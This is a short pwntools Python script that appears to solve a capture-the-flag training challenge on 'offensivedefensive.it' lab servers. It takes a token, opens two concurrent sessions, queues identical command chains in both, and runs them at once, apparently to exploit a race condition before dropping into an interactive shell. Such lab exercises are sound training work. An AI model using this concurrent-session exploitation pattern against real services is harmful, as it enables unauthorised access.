from pwn import *

def get_token(p):
    p.recvuntil(b'token: ')
    return p.recvline().strip()

def add_commands(p, commands: list):
    p.recvuntil(b'Execute the command chain\n')
    p.sendline(b'1')
    p.recvuntil(b'> ')
    for command in commands:
        p.sendline(command)
        p.recvuntil(b'> ')
    p.recvuntil(b'Timeout\n')
    
def read_commands(p):
    pass
    
def execute_commands(p):
    p.recvuntil(b'Execute the command chain\n')
    p.sendline(b'4')

p_token = remote('swiss.training.offensivedefensive.it', 8080, ssl=True)
token = get_token(p_token)

p_1 = remote('private.training.offensivedefensive.it', 8080, ssl=True)
p_2 = remote('private.training.offensivedefensive.it', 8080, ssl=True)

p_1.recvuntil(b'Token: ')
p_1.sendline(token)
p_2.recvuntil(b'Token: ')
p_2.sendline(token)

add_commands(p_1, ['f','f','f','f','f','f','f','f','f','f','f'])
add_commands(p_2, ['f','f','f','f','f','f','f','f','f','f','f'])

execute_commands(p_1)
execute_commands(p_2)

p_1.interactive()
#p_2.interactive()